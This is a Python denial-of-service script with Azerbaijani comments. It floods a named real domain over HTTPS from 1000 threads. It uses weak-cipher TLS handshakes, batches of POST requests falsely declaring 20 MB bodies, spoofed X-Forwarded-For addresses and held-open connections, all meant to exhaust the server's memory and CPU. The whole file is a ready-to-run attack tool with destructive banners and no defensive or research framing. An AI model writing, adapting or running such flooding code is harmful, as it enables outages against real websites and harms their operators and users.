import socket
import ssl
import threading
import random
import string
import time

# --- MAXIMUM DEVASTATION CONFIG ---
TARGET_HOST = "www.appl88-vip.com"
TARGET_PORT = 443
THREADS = 1000 # Railway Paid üçün maksimal şəbəkə sıxlığı
BATCH_SIZE = 100 # Bir bağlantıda serveri boğan asinxron dalğa

def r_str(n):
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))

def death_strike():
    # SSL Handshake-i serveri CPU tərəfdən kilitləmək üçün 'Ağır' tənzimləyirik
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # Şifrləməni serveri ən çox yoran üsulda saxlayırıq
    ctx.set_ciphers('DEFAULT@SECLEVEL=1')

    while True:
        try:
            # TCP bağlantısı - Nagle alqoritmini bypass edirik (Anında zərbə)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)

            conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
            conn.connect((TARGET_HOST, TARGET_PORT))

            # BATCH STRIKE: Bir bağlantı içində serveri minlərlə yarımçıq paketlə boğmaq
            for _ in range(BATCH_SIZE):
                # Serverin API yollarını hədəf alırıq (Backend yormaq üçün)
                path = f"/?v={time.time()}&id={r_str(20)}&invite_code={random.randint(1000, 9999)}"
                ip = f"{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                
                # Bu başlıq serveri hər sorğuda daxili yaddaş (Buffer) ayırmağa məcbur edir
                # Content-Length-i 20MB göstəririk ki, server dərhal RAM ayırıb gözləsin
                payload = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {TARGET_HOST}\r\n"
                    f"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15\r\n"
                    f"X-Forwarded-For: {ip}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: 20971520\r\n" # 20 Megabyte "Yalançı" yük
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                ).encode()

                conn.sendall(payload)
                # İkinci zərbə: Serveri asılı (Hanging) saxlamaq üçün yarımçıq paketlər
                conn.send(b"\x00")
            
            # Bağlantını bağlama, timeout olana qədər serverin resursunu tut
            time.sleep(2)
            conn.close()
        except:
            pass

def main():
    print(f"☢️  DOOMSDAY PROTOCOL ACTIVATED: {TARGET_HOST}")
    print("[!] Target is being saturated with persistent zombie-connections...")
    
    for i in range(THREADS):
        t = threading.Thread(target=death_strike)
        t.daemon = True
        t.start()
        if i % 100 == 0:
            print(f"[*] {i} Heavy Warheads Launched...")
            time.sleep(0.1)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
